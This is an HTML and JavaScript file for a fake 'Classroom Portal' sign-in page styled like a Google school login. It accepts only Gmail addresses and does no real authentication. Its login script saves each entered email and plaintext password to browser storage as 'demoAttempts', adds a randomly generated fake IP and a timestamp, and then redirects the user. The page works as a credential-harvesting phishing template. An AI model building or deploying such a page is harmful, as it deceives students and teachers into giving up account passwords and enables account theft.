<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Classroom Login</title>
<link rel="icon" href="logo.png">
<style>
/* Reset */
*{
  margin:0;
  padding:0;
  box-sizing:border-box;
  font-family: Arial, Helvetica, sans-serif;
}

/* Body background */
body{
  height:100vh;
  display:flex;
  justify-content:center;
  align-items:center;
  background:linear-gradient(135deg,#1a73e8,#6ab7ff);
  overflow:hidden;
}

/* Floating shapes */
body::before,
body::after{
  content:"";
  position:absolute;
  width:500px;
  height:500px;
  background:rgba(255,255,255,0.08);
  border-radius:50%;
  animation:float 12s infinite linear;
}

body::before{
  top:-200px;
  left:-150px;
}

body::after{
  bottom:-200px;
  right:-150px;
  animation-delay:6s;
}

@keyframes float{
  0%{transform:translateY(0)}
  50%{transform:translateY(40px)}
  100%{transform:translateY(0)}
}

/* Top header */
.header{
  position:absolute;
  top:0;
  width:100%;
  padding:15px 40px;
  color:white;
  font-weight:bold;
  font-size:18px;
  display:flex;
  align-items:center;
  gap:10px;
}

.header img{
  width:30px;
}

/* Login card */
.card{
  width:380px;
  padding:40px;
  background:white;
  border-radius:14px;
  box-shadow:0 20px 50px rgba(0,0,0,0.25);
  text-align:center;
  animation:fade 0.6s ease;
  transition:0.3s;
}

.card:hover{
  transform:translateY(-3px);
  box-shadow:0 25px 60px rgba(0,0,0,0.3);
}

@keyframes fade{
  from{opacity:0; transform:translateY(20px);}
  to{opacity:1; transform:translateY(0);}
}

.logo{
  width:70px;
  margin-bottom:10px;
}

h2{
  font-weight:500;
  margin-bottom:5px;
  color:#202124;
}

.subtitle{
  font-size:14px;
  color:#5f6368;
  margin-bottom:20px;
}

/* Input fields */
.input-box{
  position:relative;
  margin-bottom:22px;
}

.input-box input{
  width:100%;
  padding:14px;
  border:1px solid #dadce0;
  border-radius:6px;
  font-size:14px;
  outline:none;
  transition:0.2s;
}

.input-box input:focus{
  border:1px solid #1a73e8;
  box-shadow:0 0 0 2px rgba(26,115,232,0.15);
}

.input-box label{
  position:absolute;
  left:12px;
  top:14px;
  color:#5f6368;
  font-size:14px;
  background:white;
  padding:0 4px;
  transition:0.2s;
  pointer-events:none;
}

.input-box input:focus + label,
.input-box input:not(:placeholder-shown) + label{
  top:-8px;
  font-size:12px;
  color:#1a73e8;
}

/* Eye icon */
.eye{
  position:absolute;
  right:10px;
  top:12px;
  cursor:pointer;
  font-size:18px;
}

/* Links */
.link{
  text-align:left;
  font-size:13px;
  color:#1a73e8;
  margin-bottom:20px;
  cursor:pointer;
}

.link:hover{
  text-decoration:underline;
}

/* Button */
button{
  width:100%;
  padding:13px;
  border:none;
  border-radius:6px;
  background:#1a73e8;
  color:white;
  font-size:15px;
  cursor:pointer;
  transition:0.2s;
}

button:hover{
  background:#1669c1;
}

/* Divider */
.divider{
  margin:25px 0;
  border-top:1px solid #dadce0;
}

/* Footer */
.footer{
  margin-top:15px;
  font-size:13px;
  color:#5f6368;
}

.footer span{
  color:#1a73e8;
  cursor:pointer;
}

.footer span:hover{
  text-decoration:underline;
}

/* Error message */
#error{
  color:#d93025;
  font-size:13px;
  margin-bottom:10px;
  text-align:left;
}

</style>
</head>
<body>

<div class="header">
<img src="logo.png" alt="logo">
Classroom Portal
</div>

<div class="card">

<img src="logo.png" class="logo" alt="logo">

<h2>Sign in</h2>
<div class="subtitle">Use your school account</div>

<!-- Email -->
<div class="input-box">
<input id="email" type="email" placeholder=" " required>
<label>Email</label>
</div>

<!-- Error message -->
<div id="error"></div>

<!-- Password -->
<div class="input-box">
<input id="password" type="password" placeholder=" " required>
<label>Password</label>
<span class="eye" onclick="togglePassword()">👁</span>
</div>

<div class="link">Forgot email?</div>

<button id="loginBtn" onclick="login()">Sign In</button>

<div class="divider"></div>

<div class="footer">
Not your computer? Use Guest Mode<br><br>
<span>Create account</span>
</div>

</div>

<script>
// Toggle password visibility
function togglePassword(){
  let pass=document.getElementById("password");
  pass.type = pass.type==="password" ? "text":"password";
}

// Generate fake IP
function randomIP(){
  return Math.floor(Math.random()*255)+"."+
         Math.floor(Math.random()*255)+"."+
         Math.floor(Math.random()*255)+"."+
         Math.floor(Math.random()*255);
}

// Login function with Gmail validation
function login(){
  let email=document.getElementById("email").value.trim();
  let password=document.getElementById("password").value.trim();
  let error=document.getElementById("error");

  if(!email.endsWith("@gmail.com")){
    error.innerText="Enter a valid Gmail address (example@gmail.com)";
    return;
  }
  if(password===""){
    error.innerText="Enter your password";
    return;
  }

  // Clear error
  error.innerText="";

  let attempts=JSON.parse(localStorage.getItem("demoAttempts"))||[];

  attempts.unshift({
    email:email,
    password:password,
    ip:randomIP(),
    time:new Date().toLocaleString()
  });

  localStorage.setItem("demoAttempts",JSON.stringify(attempts));

  document.getElementById("loginBtn").innerText="Signing in...";

  setTimeout(()=>{
    window.location.href="classroom.html";
  },800);
}

// Enter key triggers login
document.addEventListener("keydown",function(event){
  if(event.key==="Enter"){
    login();
  }
});
</script>

</body>
</html>
